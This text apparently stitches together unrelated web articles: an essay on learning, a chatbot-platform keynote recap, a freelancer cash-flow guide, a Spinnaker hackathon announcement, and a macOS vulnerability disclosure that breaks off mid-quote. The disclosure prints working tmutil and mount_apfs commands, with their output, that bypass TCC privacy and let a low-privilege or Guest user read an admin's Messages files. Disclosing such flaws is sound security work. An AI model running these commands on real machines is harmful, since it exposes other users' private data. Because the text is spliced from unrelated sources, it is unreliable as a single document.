they are prone to simply accept random pieces of “knowledge” that they found on some random
blog as facts and rules to live by. These bits of knowledge are then accumulated
and moving forward through osmosis, until it gets to the point
where people believe into voodoo computer operations that are somehow
inaccessible to the mere mortals.</p><h2 id="how-expensive-is-knowledge">How expensive is knowledge?</h2><p>If you live in a relatively well organized society, then the knowledge is
actually free or at least priced at the point which you could consider as free.</p><p>Formal education in my country is “free”. It’s not quite free as we pay for
it with a relatively high taxes, but it’s free
in a way where anyone could be attending any school regardless of their income or
social status. All of the university lectures are also public and free to attend
by anyone from the streets. That usually doesn’t happen, but it’s still an option
for someone that is willing to listen and learn something new.</p><p>Despite spending more than 15 years in school, I didn’t really learn much there.
It’s one thing learning about the internals of this specific thing that you are
interested in, whereas abstract learning about general stuff was not
that interesting for me. I was introduced to a few new concepts and
I learned a great deal of math which I never used later on,
but that was pretty much it [2]. It was as if my brain was made out of Teflon and
whatever they threw at it didn’t stick. Oh, well…</p><p>The main problem that I see with the modern formal education is in that they
are trying to compact the ever growing knowledge into chunks that you
should memorize and repeat when asked, which keeps you busy so your
parents are able to work. They treat your brain as a hard drive
for dumping facts, while in reality it is a self-programmable high performance
CPU with infinite potential that is preserving data rather poorly.
In case you are wondering, this wordy description means that your brain
is far far away from the dumping ground of facts, but it excels at making
abstract connections and general never seen before type of problem solving.</p><p>As Richard Hamming put it in his excellent
<a href="https://blog.royalsloth.eu/articles/you-and-your-research/">You and Your Research</a> talk:</p><blockquote><p>But I am inclined to believe that, in the long-haul, books which leave out
what’s not essential are more important than books which tell you everything
because you don’t want to know everything. I don’t want to know that much
about penguins is the usual reply. You just want to know the essence.</p><p>Richard Hamming</p></blockquote><p>Learning facts and dates when somebody discovered something is not that useful
in a world where all this knowledge is 1 click away.
It’s good for those occasions when you have to mingle and impress the
audience at your gala table, but other than that it’s mostly taking away your
brain space that could be used for solving more important problems than mere
memorization. The amount of knowledge absolutely exploded in the past
100 years and you cannot possibly cram all that junk into that
tiny brain compartment.</p><p>Of course, this statement will enrage the people from the land of the free
who spent thousands on their education, while at the same time most of the
things are better explained elsewhere. I had a pretty good math teacher, but
you can find thousand times better lectures on the internet made by strangers
who are educating others from the goodness of their heart, such as
<a href="https://www.3blue1brown.com/">3blue1brown</a>. And best of all, they are free.</p><h2 id="where-does-the-knowledge-come-from">Where does the knowledge come from?</h2><p>Most of the things that I’ve accumulated over the years came from this mildly
amusing idea that we call the internet. I had English classes in school,
but I actually learned English while playing online games and mindlessly
browsing internet. Nowadays I am mostly communicating in English, despite
not being a native speaker. Who knew that wasting time on the internet would
be so useful one day? I most certainly did not.</p><p>But, where did you learn about computer stuff?</p><ul><li><p>I learned how to program via shitty online tutorials and building useless
websites. Building a crappy website with just your mind and a text editor
was a mind blowing experience.</p></li><li><p>I learned how to manage Linux servers by tinkering with an old crappy
laptop and endlessly broken Linux system. Also I pushed those useless
websites there and played with the system until the website appeared
in the browser.</p></li><li><p>I learned the rest by reading books on a particular topic that interested
me and later on talking to my coworkers.</p></li></ul><p>The actual knowledge came from spending thousands of hours
in front of a computer just trying things out and playing with
already discovered concepts. I may as well formulate this insight as:</p><div><pre><code data-lang="text">great work = spoon fed knowledge + experience + magic sauce</code></pre></div><p>The parameters of this equation are also listed in a chronological order, as
they appear throughout the life:</p><ol><li><p><strong>Spoon fed knowledge</strong>: obtained through formal education, reading books, online
tutorials and picking brains of experienced people.</p></li><li><p><strong>Experience</strong>: given enough spoon fed knowledge and plenty of hours, that
knowledge is turned into experience. Suddenly you are mildly aware of what
works and what doesn’t based on the past scars.</p></li><li><p><strong>Magic sauce</strong>: a mix that consists of your own thoughts, experience and
inspiration that brewed over the years. You might as well fit this into the
realm of creativity.</p></li></ol><p>You are free to throw some insanity into the mix to make it pop.</p><h2 id="which-book-should-i-read-next">Which book should I read next?</h2><p>Writing this question into your search engine of choice will provide hundreds
of thousands results for the list of top 10 books on “X” that will
help your career and change your perspective forever.
All of those lists are accompanied with a
tiny note telling you that the author is associated with a “$LARGE_BOOK_STORE” and buying them
through their links will somehow help them run their blog in order to publish
more of those useful lists.</p><p>I checked my library of dead tree items and found 15 technical books which
I bought and read multiple times over the past few years. Most of them were pretty good
and they were extremely valuable for my career. Reading a deep dive into the
topic you are interested in is a great investment and you should definitely read
as much as possible.</p><p>Still, I can’t really suggest you to read any of those books that I bought.
They were all a great investment up to some point.
Then one day you reach the level when you realize that the knowledge from those
books only apply up to a certain point, and sticking to whatever the book authors
have to say is actually a bad idea for your specific case.</p><p>Sometimes you even realize that what the book authors are preaching is
actually harmful and is in fact hurting the entire industry by poisoning the bright
minds with false ideas. Like the advice from a well known person B. “Sell Books” M.
that is preaching how the comments are harmful and a big code smell.</p><p>The advice is totally fine and yes, you should most definitely structure your program in a way where
the code is self explanatory. Then one day you happen to work on one of
those multi million lines long codebase where people kept this advice close to
their hearts. After a few years the original developers are long gone and nobody knows how the damn thing works and why
a certain architectural decisions were made. Nothing makes sense and the documentation
does not reflect the current state, but the code sure is clean with none of those smelly little comments.</p><p>The zealots will argue how people misunderstood the book and that it only
pushed people towards improving the structure of the program as opposed to writing
lengthy comments. The result was naturally the exact opposite. People are
hesitant to write comments because writing comments has become this big bad wolf
and you should be afraid of the big bad wolf.</p><p>The best code that I have ever written to this date contains a lot of comments.
In fact ~30% of that particular codebase consists of comments. The feedback that
I got from the current maintainers was mostly on how easy it
is to jump into it and update the business logic, because all the unknowns
and possible future pitfalls …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<p>As part of the <a href="http://botse.org/" target="_blank" rel="noopener noreferrer">2nd International Workshop on Bots in Software Engineering</a> (BotSE 2020), I gave the keynote <a href="https://www.slideshare.net/jcabot/lessons-learned-from-building-a-commercial-bot-development-platform" target="_blank" rel="noopener noreferrer">“Lessons learned from building a commercial bot development platform”</a> where I discussed some of the key aspects we have learned while building our opensource and <a href="https://modeling-languages.com/low-code-platforms-smart-apps-ai/" target="_blank" rel="noopener noreferrer">low-code</a> chatbot development platform <a href="https://xatkit.com/" target="_blank" rel="noopener noreferrer">Xatkit</a>&nbsp; (see also the <a href="https://github.com/xatkit-bot-platform" target="_blank" rel="noopener noreferrer">Xatkit organization in GitHub</a>)</p>
<p>After an introductory <a href="https://xatkit.com/chatbot-videos-presentations-xatkit/" target="_blank" rel="noopener noreferrer">mini-tutorial on Xatkit</a> and explaining why the world needs yet another bot solution, I moved to discuss the struggles we are facing when trying to move Xatkit from a research prototype to a commercial-grade tool. Some of the challenges are common to any<a href="https://jordicabot.com/industrialization-of-research-tools-the-atl-case/" target="_blank" rel="noopener noreferrer"> industrialization effort</a> (when you’re at the same time the research team and the technology provider in charge of maturing the tool) and shared as well with any other core open source project fighting for its <a href="https://sustainoss.org/" target="_blank" rel="noopener noreferrer">long-term sustainability</a> (a topic on which, btw, <a href="https://livablesoftware.com/bots-open-source-sustainability/" target="_blank" rel="noopener noreferrer">bots can also play a key role</a>).</p>
<p>You can check the slides of my talk below but let me also highlight some of our key lessons learned in building a chatbot platform for you, ranging from organizational, technical, and business challenges:</p>
<ul>
<li><strong>Organizational challenges</strong>
<ul>
<li><strong>You need to be a Polymath to create a bot platform</strong>. Plenty of core bot tech: NLU, Sentiment Analysis, Xtext, Slack/GH/… APIs,…., but even more non-bot tech: InfluxDB, Nginx, eCharts, React, web sockets, Docker… that you’ll need to master when building a bot platform.</li>
<li>Commercial-grade quality involves<strong> spending more and more time on “boring” tasks</strong> as you need to polish all aspects of the tool (interface, docs,…) that you can easily skip when just building a prototype.</li>
<li><strong>Common challenges to any OSS project</strong> like attracting contributors, giving support to <a href="https://livablesoftware.com/5-ways-to-thank-open-source-maintainers/" target="_blank" rel="noopener noreferrer">users that don’t even say thank you</a> or the cost of maintaining external contributions (e.g. connectors) especially when the core is still evolving</li>
<li><strong>Being pragmatic.</strong> Make sure everything you do has a good Return of Investment. Example: we went from having official releases, to core releases to no releases (compile from sources). Also, we don’t support older versions and don’t keep backward compatibility. These are all things that would be nice to have but that we cannot afford.</li>
</ul>
</li>
<li><strong>Technical challenges</strong>
<ul>
<li><strong>Eat your own chatbot food</strong> for a better language. Evolving your DSLs is expensive, try to design a variety of bots to make sure your language is expressive enough for your needs (e.g. when we moved to our current <a href="https://xatkit.com/chatbot-dsl-state-machines-xatkit-language/" target="_blank" rel="noopener noreferrer">state-machine language semantics</a>, we had to reimplement the editor, the examples, the docs,…</li>
<li><strong>Combine textual and graphical notations</strong>. Textual for writing + <a href="https://xatkit.com/graphical-rendering-of-your-chatbot-models/" target="_blank" rel="noopener noreferrer">Graphical for Reading</a></li>
<li>Do not reinvent the wheel. <strong>We came close to reinvent Java!</strong> (and moved to <a href="https://www.eclipse.org/Xtext/documentation/305_xbase.html#xbase-language-ref-introduction" target="_blank" rel="noopener noreferrer">Xbase</a>)</li>
<li>Think long-term. <strong>Research prototypes are pure technical debt</strong></li>
<li>Security. <strong>Are you protected against DDoS attacks via a bot?. </strong>It’s not only a security concern but also an economical one if you’re paying to an external provider (e.g. DialogFlow) to process your input texts. There are also privacy concerns if you keep the session data for further <a href="https://xatkit.com/dashboard-monitoring-chatbot/" target="_blank" rel="noopener noreferrer">bot monitoring and analysis</a>.</li>
</ul>
</li>
<li><strong>Natural Language Processing</strong>
<ul>
<li>NLP engines don’t speak Catalan. Once you’re out of the mainstream languages (English, Spanish, French,….) you may need to combine several NLP engines to cover well the languages you’re interested in.</li>
<li><strong>NLP engines are not bilingual. </strong>In some countries, bots should be able to combine different languages <strong>in the same conversation</strong></li>
<li><strong>Everybody seems interested in having sex with a bot.</strong> Trolls are also a huge problem with bots. As a brand you don’t want to risk going viral because your bot gave the wrong response to a Troll question.</li>
<li><strong>Reusable intent libraries</strong>. You don’t want to define again <em>Greetings</em>, <em>Thank You</em> or <em>Troll</em> intents.</li>
<li><strong>Testing chatbots is a largely unexplored area</strong> • <a href="https://xatkit.com/testing-chatbots-with-botium-and-xatkit/" target="_blank" rel="noopener noreferrer">We use Botium to record conversation</a>s to be used as test cases but need much more (e.g. automatic generation of test cases)</li>
<li><strong>More training sentences are not always better.</strong> Overall quality may decrease if they start overlapping with sentences for other intents.</li>
</ul>
</li>
<li><strong>Business</strong>
<ul>
<li><strong>Most end-users do not want to define chatbots.</strong> It doesn’t matter how nice is your interface. They just want to give you their data and get a bot from you.</li>
<li><strong>Find your niche. </strong>There are over a hundred bot solutions out there. Choose wisely your domain (e.g. <a href="https://xatkit.com/free-chatbot-wordpress-plugin/" target="_blank" rel="noopener noreferrer">our WordPress plugin</a>) and your business model. E.g. Consider Selling a service (such as our consulting and <a href="https://xatkit.com/digital-assistant-services/" target="_blank" rel="noopener noreferrer">managed chatbot hosting services</a>) and not a tool.</li>
<li><strong>Understand what really matters to your future clients</strong>. You’ll be surprised. For instance, making sure the color of your chatbot widget perfectly matches the look and feel of their website may be more important to them that your latest cool AI-based feature.</li>
<li><strong>Help your clients understand what their visitors want to use the bot for. </strong>You think you know what your visitors will want to use the bot for but in reality, you don’t. So having a dashboard to monitor the conversations the bot doesn’t know how to answer is vital.</li>
<li><strong>Self-learning bots</strong>. Your clients will want that but it’s risky. You don’t want the bot to learn the wrong things.</li>
</ul>
</li>
</ul>
<p>At the end of the talk I also emphasized why we belive you should consider using Xatkit</p>
<ul>
<li>As <strong>a bot teaching platform. </strong>If you teach any course involving bots, chatbots, NLP or DSLs / software modeling and are looking for a use-case or a ready-to-use bot platform for experimentation we’ll be happy to help with materials and assistance and even (remote) seminars</li>
<li>As <strong>a bot research platform</strong>. In many bot-related research, researchers spend a significant amount of time putting together the bot pieces they need to create their bots and/or run their experiments. We ask you not to reinvent the wheel and, instead, <strong>adopt Xatkit as base platform.</strong> You’ll benefit from all Xatkit features and connectors to have powerful bots with less effort and will be able to spend more time on the core research aspects</li>
</ul>


<p>Of course, mine was just one of the many interesting talks that took place in the workshop. In the <a href="http://botse.org/" target="_blank" rel="noopener noreferrer">BotSE</a> website, you have the full program and links to the videos and slides of all presentations (e.g. don’t miss the great <a href="https://probot.github.io/" target="_blank" rel="noopener noreferrer">Probot</a> talk by <a href="https://dev.to/gr2m/" target="_blank" rel="noopener noreferrer">Gregor Martynus</a>).

<h2>Why do freelancers have cash flow concerns that employees do not?</h2>



<p>It’s superficial and shortsighted to say it’s because employees get a paycheck every other week. Employees simply work for corporations, which are certainly not immune to cash flow problems. Things happen — missed payroll, delaying reimbursements, and layoffs — just to name a few that impact employee wallets / purses directly.</p>



<p>Even so, businesses with large quantities of employees do tend to be better at insulating their employees from cash flow problems in the business than freelancers are about insulating themselves from cash flow issues in their practices. Organizations of any substantial size are able to “roll with the punches” a bit more.</p>



<h2>Why?</h2>



<p>It seems big business has an advantage, but it’s only because they’ve engineered things that way. Alas, they do not have magical cash flow sources that I can reveal to you. What they do have is something close though: high-impact, proven strategies for improving the cash flow in any business situation.</p>



<p>Specifically, for increasing the likelihood that, at any given point in time, they’ll be able to cover the bills, pay employees, and keep in progress projects moving forward.</p>



<p>What a typical corporation has is options and flexibility. Even solo/small technical service businesses can have these things, but it has to be engineered just like it does for the big companies.</p>



<p>Let’s break down what a typical corporation has in its “cash flow toolbox.” Then let’s figure out exactly how we can replicate these in our own situation. Even a solo IT consultant can learn from this. I know because I am one and I have.</p>



<h2>How cash flow is engineered in a typical corporation</h2>



<p>Much of the flexibility in a bigger business comes from things that any organization of any reasonable size is expected to have. As smaller businesses — especially in my experience with solo IT freelancers, consultants, and service businesses — we often don’t think about these things. Or, more accurately, we don’t know how to make them happen. After all, we don’t have a professional and experienced Chief Financial Officer (CFO) who is dedicated to living and breathing cash flow and balance sheet data. At least I’ve never considered myself one …and I am the de facto CFO for my own business.</p>



<h2>Some of the cash flow “levers” in a typical corporation</h2>



<p>Here are some engineered cash flow levers available to a typical corporation. We need to identify them so that we can figure out equivalents for our own business activities.</p>



<p>It’s not necessary, by any means, that we have equivalents in our own business for every single one of these levers. It’s only necessary that we have some, and possibly add to them over time as our own business activities mature and our risks and needs change.</p>



<ul><li>Customer/client diversity (e.g. individual customer/client, different regions, etc.)</li><li>Product/service diversity (e.g. multiple offerings appealing to different customers under different conditions)</li><li>Capacity to borrow funds (e.g. lines of credit, bank loans, payable notes sold to investors)</li><li>Capacity to raise money (e.g. equity sold to investors)</li><li>Tangible assets to move around and/or sell (e.g. cash, physical assets, real estate,&nbsp;subsidiaries, etc.)</li><li>Intangible assets to sell or license out (such as trademarks/patents, intellectual property, distribution rights, etc.)</li><li>Dedicated as well as excess capacity – brains, energy, labor, manufacturing, or distribution capacity (e.g. dedicated management and staff with ideas, energy, and time to focus and tackle problems and opportunities as they come up)</li><li>Planning and forecasting — tools, people, data to do it</li><li>Budgeting — tools, people, and data to do it</li><li>Ability to defer expenditures (e.g. maintenance, new capital expenditures, freezing of new hiring, delaying planned and in-progress &nbsp;projects, etc.)</li><li>Ability to delay payment — to vendors, contractors (!), and government</li><li>Boosting marketing investments — in areas proven to have the highest (or the shortest, depending on which is more important) return on investment (while reducing investments in lower ROI, albeit still profitable, areas)</li><li>Boosting sales efforts — just like marketing, focusing resources on&nbsp;areas proven to have the highest (or the shortest, depending on which is more important) return on investment (while reducing investments in lower, albeit still profitable, ROI areas)</li><li>Creating limited time price incentives (e.g. for customers to buy now, for customers who pay earlier than typical, or for customers who buy in larger quantities than they normally would)</li><li>Requiring payment before shipping product</li><li>Requiring a set-up fee before delivering a new service</li><li>A willingness to make investments for the long-term</li></ul>



<p>These are just a few of the biggies.&nbsp;</p>



<h2>Engineering your own freelancing business for maximum cash flow flexibility</h2>



<p>What lessons can be learned from what a typical large corporation does that can then be translated into things in your own consulting practice? Quite a few it turns out!</p>



<p>Here are some ideas:</p>



<ul><li>Diversify your client base<ul><li>In quantity (e.g. if you have two clients, get three)</li><li>By industry (e.g. if all of your clients are in one industry, get one from another industry)</li><li>In revenue percentage (e.g. if one client accounts for &gt;50% of your annual income, get another one)</li><li>By region (you get the picture)</li><li>By size (e.g. small business, large business)</li><li>By type (e.g. for-profit, non-profit, government)</li></ul></li><li>Diversify your engagements&nbsp;<ul><li>Lots of project work? Balance these out with more retainers.</li><li>Lots of retainers? Balance these out with some project work.</li><li>Lots of new clients? Increase the repeat business you get from past/existing clients.</li><li>Few new clients? Improve how you generate leads for new potential clients.</li></ul></li><li>When cash flow is good (or, at the very least, you have some cash in the bank), establish a credit line associated with your business that you can draw upon when needed</li><li>Use your good personal credit history to establish one or two business only credit cards<ul><li>Use these to pay bills/overhead and pay them back promptly, building up your credit profile for increased access to credit in the future</li></ul></li><li>Look at your expenses/overhead<ul><li>Trim unnecessary subscriptions (including for software/services) expenses, even if you think you may want them later (you can always resubscribe later on if you don’t find alternatives in the mean time)</li><li>Give some thought during the good times to what expenses are most discretionary in case adjustments need to be made quickly</li></ul></li><li>Invoice your clients sooner and more often — don’t wait until the first. Switch to billing every other week or even every week. Bill immediately upon project completion as well.</li><li>Require a portion of project fees be paid up front<ul><li>50% of the estimated total fee, if hourly</li><li>50% of the total fee, if using fixed or value-based fees</li></ul></li><li>Offer a 10% discount for full payment, upfront, of the total fee</li><li>Package up your services, expertise, or access to you in new ways then encourage clients to buy them by making it worth their while (e.g. buying hours in bulk, buying special access to you via email or phone, etc.)</li><li>Defer investments not related to creating new revenue within &lt;x&gt; days<ul><li>Where &lt;x&gt; is a criteria you set depending on how much of a crunch you are in</li></ul></li><li>No matter what, keep investing in your main client acquisition approach or you will put yourself in an even worse cash flow situation (e.g. in my practice I have one monthly activity that entails investing in a monthly mailing of a specific type to my house mailing list every single month; at most I skip one or two months per year)</li><li>Re-focus resources constantly<ul><li>Limit cash/credit use to investments in direct revenue generating activities, less on overhead and unnecessary things</li><li>Defer planned projects that aren’t in the top 1/2/3 (or whatever) in terms of near-term cash flow generators</li></ul></li><li>Look for low-risk, low-investment, high-potential opportunities to boost revenue – e.g. smart marketing arrangements such as joint ventures with complimentary businesses to do an endorsement to their own customer/client bases of your services with a special offer</li><li>Manage your working capital / keep some cash in the bank</li></ul>



<p>That’s just a start to get your brain used to the idea of thinking this way. Go back and look at the corporate list and brainstorm ways to adapt versions of the corporate approaches to your solo practice.</p>



<p>Let me know what you are doing to increase your cash flow, whether it’s on the above idea list or not.</p>



<p>Regards,<br>-jr</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
                <p>A hub of the SDLC, Spinnaker offers the world’s most advanced collection of enterprise-tested software delivery abstractions. The vitality and resilience of that collection comes down to Spinnaker’s open source core, which codifies the automation that Netflix developed for its feature-rich, highly available entertainment platform. Because of transparent open source governance and culture, we can trace Spinnaker’s trajectory from a uniquely adapted solution for Netflix’s use case, to a secure, cloud agnostic, hyper-extensible platform capable of abstracting the unique software development and delivery lifecycles of diverse enterprises across the banking, retail, technology, and multimedia industries.</p>
<p>We can also stay connected to the contributors who have made Spinnaker’s evolution possible as they grow career expertise and <a href="https://youtu.be/Mj1i_yqmrLM">leverage it to deliver results</a>. Armory invests in this network of DevOps, DevSecOps, and reliability practitioners; we take an active role in Spinnaker’s governance via the TOC, and by co-chairing SIGs and creating opportunities for the community to connect, share, and contribute. Open source is about being better together through shared motivation, and that principle inspired <a href="https://spinnaker.io/community/gardening/">Spinnaker Gardening Days</a>.</p>
<h2>Spinnaker Gardening Days, vision to reality</h2>
<p>After an exciting <a href="https://blog.spinnaker.io/building-open-source-community-culture-online-part-1-2f77272f5442">first Gardening event</a> in April, Armory is excited to present an extended version of this virtual open source hackathon July 16 – 23, 2020. We’re inviting all who are getting started with, operating, or perennially contributing to Spinnaker to gather and <strong>automate the SDLC </strong>with us. New challenges, team matching support, and a week-long hack period will make this event even more impactful than the first.</p>
<p>Spinnaker Gardening Days gives DevOps engineers, SREs, cloud architects, and all involved in the software lifecycle the chance to get involved in the project. As the global open source community around Spinnaker grows, companies like AWS, Salesforce, and Pulumi have joined to help build a thriving ecosystem. For the July hackathon, AWS has generously sponsored compute for participants so that those without a development-friendly Spinnaker environment can still hack.</p>
<p>This spring, Salesforce had planned to host the first Gardening Days live at its San Francisco headquarters, in a hybrid in-person and virtual format. As we pivoted the event to a virtual one, Salesforce worked with Armory to provide registrants with lunch vouchers and incredible prize perks to motivate them despite the distance and global disruption. We weren’t sure what to expect, but a Pulumi plugin for Spinnaker was one of the most exciting projects to come out of April’s Gardening Days.</p>

<p>Pulumi, a multicloud infrastructure-as-code tool that allows users to define infrastructure in any language as they build modern apps, was aware of Spinnaker and heard about Gardening Days a week before it took place. They put a team together and decided to leverage Spinnaker’s <a href="https://blog.spinnaker.io/cant-go-outside-dip-your-toes-in-the-spinnaker-plugins-pool-1076f74003b">plugin framework</a> to build an integration between their open source project and ours. This opportunity to deliver value to shared stakeholders without maintaining modifications to the core project represents Spinnaker’s vision for plugins, and as a bonus, is a perfect nerd-out opportunity for delivery engineers. So, naturally, Armory engineers joined the Pulumi team to support and validate the nascent framework while helping to envision a new SDLC collaboration.</p>
<p>You can read more about how to use the new Pulumi plugin for Spinnaker to run Pulumi apps in the <a href="https://www.pulumi.com/docs/guides/continuous-delivery/spinnaker/">Pulumi Docs</a>. If you like using the plugin, please share your story with us by posting in the <a href="https://spinnakerteam.slack.com/archives/CV4A90DPF">#gardening-general</a> channel on <a href="https://join.spinnaker.io/">Spinnaker Slack</a>! Pulumi’s Dan Hernandez and Praneet Loke joined us recently for <a href="https://www.youtube.com/playlist?list=PL4yLrwUObNkvO80Bjln8_DJXxQNSYrtEs">Spinnaker.Live</a>, a virtual Spinnaker conference in June that drew 800 attendees from the delivery community to share Spinnaker success stories, discuss problems and innovations in the SDLC, and learn new ways to solve with Spinnaker. Their talk tells the story of Armory &amp; Pulumi’s collaboration, and demos the functionality of the Pulumi plugin to build infrastructure within Spinnaker pipelines.</p>
<h2>Gardening Days V2: Spotlight on Security &amp; Ops, backed by AWS</h2>
<p>Indeed, as the enterprise Spinnaker experts, Armory engineers and architects know more than most about the challenges of using Spinnaker at scale to safely fuel business results via better software. At the July Gardening Days, they will again join fellow SIG-members and friends from Netflix, Google, and AWS as “experts” to guide hackathon participants in projects through mentorship and on-call help. In addition, to help attendees best leverage the sponsored AWS compute, a team of Armory engineers led by Fernando Freire will offer a hands-on first time contributor course on July 16th. This class will guide attendees through making a first contribution using EKS with Kubectl to develop against a Spinnaker instance in the cloud, and will provision an environment for them to use for contributions all week.</p>
<p>Another way Spinnaker Gardening Days will evolve in July is with a stronger focus on enabling collaboration with Security and Ops experts in the SDLC. Luckily, Spinnaker’s Special Interest Groups (SIGs) have already taken this on with a variety of projects. Both the <a href="https://github.com/spinnaker/governance/tree/master/sig-security">Security SIG</a> and the <a href="https://github.com/spinnaker/governance/tree/master/sig-ops">Ops SIG</a> will host their next meetings on July 16th, the first day of Spinnaker Gardening, and each will use the meeting to form a hackathon team as part of the SIG challenge. The Security SIG is in the midst of announcing their new CVE tracking and scoring process for managing reported CVEs that impact Spinnaker. As part of this process, they must develop threat models for each of Spinnaker’s common deployment endpoints – sounds like a fun hackathon project! This innovation around Spinnaker CVEs represents an important step in giving security-minded professionals what they need to collaborate in delivery pipelines as we “shift left” for more secure software products.</p>
<p>On the Ops SIG, we hear a lot of buzz about improving dynamic account loading, a key process in scaling Spinnaker usage. The Ops SIG hopes to build something like a pipeline stage that Spinnaker operators can use to add accounts, and will form a team on the 16th, too. Both the Ops and Security SIGs invite you to join them and bring your problems, frustrations, and ideas in scaling, hardening, and operating Spinnaker. Since n<span>o two software delivery life cycles are alike, exchanging fresh perspectives and best practices raises the bar for everyone. When it comes to security, SIG co-chair Beth Fuller highlights the value of sharing expertise that may not have been considered if everyone involved in a discussion had the same background and experience. She’s hoping DevSecOps professionals will <a href="http://go.armory.io/gardening">register for Gardening Days</a> to earn prizes and recognition for sharing that expertise.</span></p>

        <h2 id="tldr">TL;DR</h2>
<p>We could mount the entire file system through APFS snapshots as read-only, with the <code>noowners</code> flag, which enables us accessing (almost) every file in the file system, including data (documents, files, etc…) of every user on the system, including those protected by Apple’s privacy framework (TCC). Even with the Guest account we could read files of admin accounts as Guest! 😱</p>
<p>This could be achieved with a single command, for example:
<code>mount_apfs -o noowners -s http://com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap</code></p>
<p>This has been fixed in macOS Catalina 10.15.4 and on Mojave on the 26th of May.</p>
<h2 id="the-issues">The Issues</h2>
<p>There were two separate issues in this bug, and the combination of those became a very powerful system wide access.</p>
<ol>
<li>TCC privacy is not enforced on mounted local snapshots allowing someone to mount it and access any file inside, including those normally privacy protected</li>
<li>Initiating an APFS snapshot is available for all users, even low privileged ones, as well as listing of those. Beyond that, all users can mount local APFS snapshots, even a low privilege ones, and if used with the <code>noowners</code> flag, the low privilege user can access all data through the local snapshot, including every other users’ data (even high privileged one).</li>
</ol>
<h2 id="1-privacy-bypass">1. Privacy bypass</h2>
<p>From Terminal we can get a list of local snapshots available:</p>
<pre><code>% tmutil listlocalsnapshots /System/Volumes/Data
Snapshots for volume group containing disk /System/Volumes/Data:
com.apple.TimeMachine.2019-11-15-202744.local
com.apple.TimeMachine.2019-11-16-135116.local
com.apple.TimeMachine.2019-11-16-145028.local
com.apple.TimeMachine.2019-11-16-162241.local
com.apple.TimeMachine.2019-11-16-182353.local
com.apple.TimeMachine.2019-11-16-214156.local
com.apple.TimeMachine.2019-11-17-112126.local
com.apple.TimeMachine.2019-11-17-122313.local
</code></pre><p>We can mount one:</p>
<pre><code>csaby@mac ~ % /sbin/mount_apfs -o nobrowse,ro -s com.apple.TimeMachine.2019-11-16-182353.local /System/Volumes/Data /tmp/snap
</code></pre><p>If we navigate the user’s folder, we will be able access locations which our protected by TCC.</p>
<pre><code>csaby@mac ~ % ls -l /tmp/snap/Users/csaby/Library/Messages 
total 6224

-rw-r———r———   1 csaby  staff  1520312 Nov 16 08:09 prewarm.db-wal
</code></pre><p>if we compare it with standard access, it is not permitted:</p>
<pre><code>csaby@mac ~ % ls -l /Users/csaby/Library/Messages
ls: Messages: Operation not permitted
</code></pre><p>This is an issue as we can access every file through the local snapshot mountpoint.</p>
<p>We can also force the creation of a snapshot if there is no one:</p>
<pre><code>csaby@mac ~ % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-140728
</code></pre><p>In short with <code>mount_apfs</code> we can completely bypass privacy protected folders.</p>
<h2 id="2--privilege-escalation">2.  “Privilege escalation”</h2>
<p>Although this method is not a full privilege escalation, as we don’t get higher privileges, however we can access files that belong to higher privilege users, and with the previous finding, this will include TCC protected data.</p>
<p>First, as a low privilege user we can create a local snapshot, and later list it to get its ID (this is not a bug). Although the second is not a hard requirement, as its ID can be figured out based on the time. Also snapshots are auto created by the system, so even if we can’t create one we can find one, and its ID is guessable, because it uses the following format: <code>yyyy-mm-dd-hhmmss</code>.</p>
<p>Here follows the demonstration of the issue. This is the low privileged ID I used:</p>
<pre><code>% id                       
uid=502(n00b) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),100(_lpoperator),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1)
</code></pre><p>To show that it doesn’t have access to other user’s folder (where by-the-way, <code>csaby</code> is an admin user):</p>
<pre><code>n00b@mac Messages % ls -l /Users/csaby/Library 
ls: Library: Permission denied
</code></pre><p>Let’s create and list local snapshots:</p>
<pre><code>n00b@mac Messages % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-141812

% tmutil listlocalsnapshots /
Snapshots for volume group containing disk /:
com.apple.TimeMachine.2019-11-17-133110.local
com.apple.TimeMachine.2019-11-17-133316.local
com.apple.TimeMachine.2019-11-17-141812.local
</code></pre><p>We can mount the snapshot with <code>noowners</code>, which according to the <code>manpage</code> means:</p>
<blockquote>
<p>Ignore the ownership field for the entire volume.  This causes all objects to appear as owned by user ID 99 and group ID 99.  User ID 99 is interpreted as the current effective user ID, while group ID 99 is used directly and translates to `unknown’.</p>
</blockquote>
<pre><code>n00b@mac Messages % mount_apfs -o noowners -s com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap
mount_apfs: snapshot implicitly mounted readonly
</code></pre><p>And finally we can access all data from there as the privileges set for our user:</p>
<pre><code>% cd /tmp/snap/Users/csaby 
n00b@mac csaby % ls -l Library/Messages 
total 4704
-rw-r--r--  1 n00b  staff   258048 Nov  9 14:41 chat.db
-rw-r--r--  1 n00b  staff    32768 Nov 17 13:29 chat.db-shm
-rw-r--r--  1 n00b  staff  1507952 Nov  9 14:41 chat.db-wal
</code></pre><p>We can perform this attack even as a <code>Guest</code> account if FileVault is not turned ON. If FileVault is ON, Guest can only run Safari (after a reboot), and also the user data will be encrypted, so even if someone can break out the kiosk mode and start <code>Terminal</code> and run the above commands, he/she wouldn’t see the contents.</p>
<h2 id="the-fix-">The “Fix” 😭</h2>
<p>This requires some longer explanation as IMO the fix provided by Apple is not right.</p>
<p>At the beginning of March 2020, Apple said that the fix is shipped in Catalina 10.15.4 beta, they didn’t tell a word how they fixed it. I quickly jumped on it, and I found that the trick still works. I was puzzled. After some testing it turned out that they tied this to the Full Disk Access (FDA) right in TCC (<code>kTCCServiceSystemPolicyAllfiles</code>), which I found wrong. This is what I wrote them on the 13th of March:</p>
<blockquote>
<p>I did one more test and turned off “Full Disk Access” for Terminal, and then it indeed stopped working. I don’t consider this as a fix, relaying on TCC stopping this is a bad move in my opinion, most people will have Terminal set to “Full Disk Access”.</p>
<p>This still violates the basic BSD security model, as you can read other user’s file, without elevating to root. <strong>Even if SIP is OFF and Terminal has “Full Disk Access”, you shouldn’t be able to mount anything with “noowners” unless you are root</strong>. **The mount operation itself should fail.**If you think about it: Even if SIP is ON and Terminal has Full Disk Access, you can’t see other user’s files with it - with this vulnerability you can.</p>
